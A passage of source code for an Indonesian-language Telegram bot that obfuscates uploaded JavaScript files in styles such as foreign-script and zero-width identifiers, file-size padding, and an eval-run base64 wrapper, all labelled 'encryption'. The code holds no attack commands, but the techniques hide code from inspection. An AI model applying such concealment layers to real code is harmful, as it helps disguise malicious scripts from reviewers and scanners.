            },
            {
                caption: `✅ China Style Encryption Successful\n• Type: Mandarin Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncChina completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encchina: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCARAB ==========
bot.command(/^\/encarab$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encarab")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Arab Style...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Arab Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getArabObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'arab-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `arab-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Arab Style Encryption Successful\n• Type: Arabic Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncArab completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encarab: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCJAPAN ==========
bot.command(/^\/encjapan$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encjapan")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Japan Style...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Japan Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getJapanObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'japan-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `japan-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Japan Style Encryption Successful\n• Type: Japanese Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncJapan completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encjapan: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCJAPANXARAB ==========
bot.command(/^\/encjapanxarab$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encjapanxarab")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Japan X Arab Style...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Japan X Arab Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getJapanxArabObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'japxab-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `japxab-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Japan X Arab Style Encryption Successful\n• Type: Mixed Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncJapanXArab completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encjapanxarab: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCNEW ==========
bot.command(/^\/encnew$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encnew")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi New Style (Advanced Hardened)...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan New Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getNewObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'new-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `new-enc-${doc.file_name}`,
            },
            {
                caption: `✅ New Style Encryption Successful\n• Type: Advanced Hardened\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncNew completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encnew: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCINVISHARD ==========
bot.command(/^\/encinvishard$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encinvishard")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Invis Hard...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Strong Obfuscation`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getStrongObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'invishard-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `invishard-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Invis Hard Encryption Successful\n• Type: Strong Obfuscation\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncInvisHard completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encinvishard: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCINVIS ==========
bot.command(/^\/encinvis$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encinvis")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Invisible...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Invisible Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getInvisObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'invis-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `invis-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Invisible Encryption Successful\n• Type: Zero-Width Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncInvis completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encinvis: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCSTEALTH ==========
bot.command(/^\/encstealth$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encstealth")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Stealth...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Stealth Style`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getStealthObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'stealth-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `stealth-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Stealth Encryption Successful\n• Type: Minimal Identifiers\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncStealth completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encstealth: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: CUSTOMENC ==========
bot.command(/^\/customenc (.+)$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "customenc")) return;

        const customName = match[1].replace(/[^a-zA-Z0-9_]/g, "");
        if (!customName) {
            return ctx.reply("❌ *Error:* Nama kustom harus berisi huruf, angka, atau underscore!", { parse_mode: "Markdown" });
        }

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi dengan custom name: ${customName}...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan custom name: ${customName}`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getCustomObfuscationConfig(customName)
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, `custom-${customName}`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `custom-${customName}-${doc.file_name}`,
            },
            {
                caption: `✅ Custom Encryption Successful\n• Custom Name: ${customName}\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ CustomEnc (${customName}) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error customenc: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCSTRONG ==========
bot.command(/^\/encstrong$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encstrong")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Strong (Maximum Security)...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Strong Security`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getStrongObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'strong-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `strong-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Strong Encryption Successful\n• Type: Maximum Security\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncStrong completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encstrong: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCBIG ==========
bot.command(/^\/encbig (\d+)$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encbig")) return;

        const targetSizeMB = Math.max(1, parseInt(match[1], 10));

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi dengan target ${targetSizeMB}MB...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan target size ${targetSizeMB}MB`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getBigObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        const currentSizeBytes = Buffer.byteLength(obfuscatedCode, "utf8");
        const targetSizeBytes = targetSizeMB * 1024 * 1024;
        
        if (currentSizeBytes < targetSizeBytes) {
            const paddingSize = targetSizeBytes - currentSizeBytes;
            const padding = crypto.randomBytes(paddingSize).toString("base64");
            obfuscatedCode += `\n/* Binary Padding (${paddingSize} bytes) */\n// ${padding}`;
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, `big-${targetSizeMB}mb`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `big-${targetSizeMB}mb-${doc.file_name}`,
            },
            {
                caption: `✅ Big Encryption Successful\n• Target Size: ${targetSizeMB}MB\n• Actual Size: ~${(currentSizeBytes/1024/1024).toFixed(2)}MB\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncBig (${targetSizeMB}MB) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encbig: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCULTRA ==========
bot.command(/^\/encultra$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encultra")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Ultra Security...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Ultra Security`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getUltraObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'ultra-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `ultra-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Ultra Encryption Successful\n• Type: Ultra Security\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncUltra completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encultra: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCMAX ==========
bot.command(/^\/encmax (\d+)$/i, async (msg, match) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encmax")) return;

        const intensity = Math.min(Math.max(1, parseInt(match[1], 10)), 10);

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply(`🔒 Memulai proses enkripsi Max dengan intensity ${intensity}/10...`);

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Max intensity ${intensity}/10`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getMaxObfuscationConfig(intensity)
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, `max-${intensity}`, '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `max-${intensity}-${doc.file_name}`,
            },
            {
                caption: `✅ Max Encryption Successful\n• Intensity: ${intensity}/10\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncMax (${intensity}) completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encmax: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCQUANTUM ==========
bot.command(/^\/encquantum$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encquantum")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Quantum Vortex...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Quantum Vortex`));

        const obfuscatedCode = await obfuscateQuantum(fileContent);

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'quantum-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `quantum-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Quantum Encryption Successful\n• Type: Quantum Vortex\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncQuantum completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encquantum: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCX ==========
bot.command(/^\/encx$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encx")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi X Invisible...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan X Invisible`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getXObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        const encodedInvisible = encodeInvisible(obfuscatedCode);
        const finalCode = `
        (function(){
            function decodeInvisible(encodedText) {
                if (!encodedText.startsWith('\\u200B')) return encodedText;
                try {
                    return Buffer.from(encodedText.slice(1), 'base64').toString('utf-8');
                } catch (e) {
                    return encodedText;
                }
            }
            try {
                const hiddenCode = "${encodedInvisible}";
                const decodedCode = decodeInvisible(hiddenCode);
                if (!decodedCode || decodedCode === hiddenCode) throw new Error("Decoding failed");
                eval(decodedCode);
            } catch (e) {
                console.error("Execution error:", e);
            }
        })();
        `;

        try {
            new Function(finalCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(finalCode, 'x-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `x-enc-${doc.file_name}`,
            },
            {
                caption: `✅ X Invisible Encryption Successful\n• Type: X Invisible\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncX completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encx: ${error.message}`));
        await ctx.reply(
            `❌ Kesalahan: ${error.message || "Tidak diketahui"}\nCoba lagi dengan kode Javascript yang valid!`
        );
    }
});

// ========== COMMAND: ENCNOVA ==========
bot.command(/^\/encnova$/i, async (msg) => {
    const ctx = { message: msg, reply: bot.sendMessage.bind(bot), telegram: bot.telegram };
    
    try {
        if (!await checkUserLimit(ctx, "encnova")) return;

        const doc = validateFile(ctx, ['.js']);
        if (!doc) return;

        const progressMessage = await ctx.reply("🔒 Memulai proses enkripsi Nova Dynamic...");

        const fileLink = await bot.telegram.getFileLink(doc.file_id);
        console.log(chalk.blue(`📥 Mengunduh file: ${doc.file_name}`));

        const response = await fetch(fileLink.href);
        let fileContent = await response.text();

        console.log(chalk.blue(`✅ Memvalidasi kode: ${doc.file_name}`));
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        console.log(chalk.blue(`🔐 Mengenkripsi dengan Nova Dynamic`));

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getNovaObfuscationConfig()
        );

        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        const { filePath } = createTempFile(obfuscatedCode, 'nova-enc', '.js');

        await ctx.replyWithDocument(
            {
                source: filePath,
                filename: `nova-enc-${doc.file_name}`,
            },
            {
                caption: `✅ Nova Encryption Successful\n• Type: Nova Dynamic\n\nBy @ReyValdz`,
                parse_mode: "Markdown",
            }
        );

        cleanupTempFile(filePath);
        console.log(chalk.green(`✅ EncNova completed for ${msg.from.id}`));

    } catch (error) {
        console.error(chalk.red(`❌ Error encnova: ${error.message}`));
        await ctx.reply(
